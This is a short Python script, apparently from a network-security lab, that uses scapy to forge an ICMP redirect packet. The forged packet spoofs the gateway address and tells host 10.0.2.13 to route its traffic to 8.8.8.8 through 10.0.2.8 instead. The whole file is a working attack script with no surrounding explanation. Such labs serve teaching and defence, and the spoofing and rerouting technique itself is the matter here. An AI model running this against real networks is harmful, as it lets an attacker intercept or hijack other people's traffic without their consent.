#!/usr/bin/python3
from scapy.all import *
ip = IP(src = '10.0.2.1', dst = '10.0.2.13')
icmp = ICMP(type=5, code=1)
icmp.gw = '10.0.2.8'
# The enclosed IP packet should be the one that
# triggers the redirect message.
ip2 = IP(src = '10.0.2.13', dst = '8.8.8.8')
send(ip/icmp/ip2/UDP())